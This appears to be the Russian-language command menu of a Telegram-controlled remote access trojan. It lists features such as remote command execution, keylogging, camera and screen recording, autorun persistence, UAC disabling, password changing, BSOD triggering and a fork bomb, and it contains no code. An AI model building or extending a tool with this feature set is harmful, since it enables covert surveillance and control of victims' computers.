start - Запуск бота
cmd - Выполнить команду в системе
screenshot - Сделать скриншот экрана
msgbox - Показать сообщение пользователю
plyer_msgbox - Показать уведомление пользователю
record_screen - Записать экран
hotkey - Нажать комбинацию клавиш
type - Напечатать что-то
upload - Загрузить файл на ПК
shutdown - Выключить ПК
quick_reboot - Быстрая перезагрузка через NtShutdownSystem
quick_shutdown - Быстрое выключение через NtShutdownSystem
restart - Перезагрузить ПК
record_video - Записать видео с камеры
list_programs - Получить список программ
blockinput - Заблокировать ввод
unblockinput - Разблокировать ввод
click_on_image - Клик на картинку
title - Изменить заголовок окна
transparent - Изменить прозрачность окна
get_all_titles - Получить список открытых окон
shake_window - Трясти окно
shake_cursor - Трясти курсор
window - Управление окном
process - Управление процессами
file - Управление файлами
download_file - Скачать файл
system - Просмотр характеристик ПК
openlink - Открыть ссылку или путь
rotate_screen - Переворот экрана
matrix - Матрица
script_dir - Посмотреть папку откуда запущен RATник
system_monitor - Мониторинг системных ресурсов
ip - Получить ip адрес
autorun - Управление автозапуском
keylogger_logs - Логи кейлогера
clear_keylogger_logs - Отчистка логов кейлогера
cd - Управление дисководом
is_admin - Проверка прав админа
restrictions - Управление ограничениями
update - Обновить файл RATника
fake_bsod - Фейковый BSOD
monitor - Управление монитором
gdi - GDI эффекты
uac -  Включить\выключить UAC
uninstall - Удалить RATник
setpass - Сменить пароль от аккаунта
setusername - Сменить имя пользователя
bsod - Вызвать BSOD
elevate - Перезапустить RATник с правами админа
playsound - Проиграть звук
setvolume - Установить громкость
flash - Заставить окно моргать
showtaskbar - Показать панель задач
hidetaskbar - Скрыть панель задач
antiviruses - Список антивирусов
forkbomb - Вызвать форкбомбу
set_wallpaper - Установить обои
mouse - Управление мышью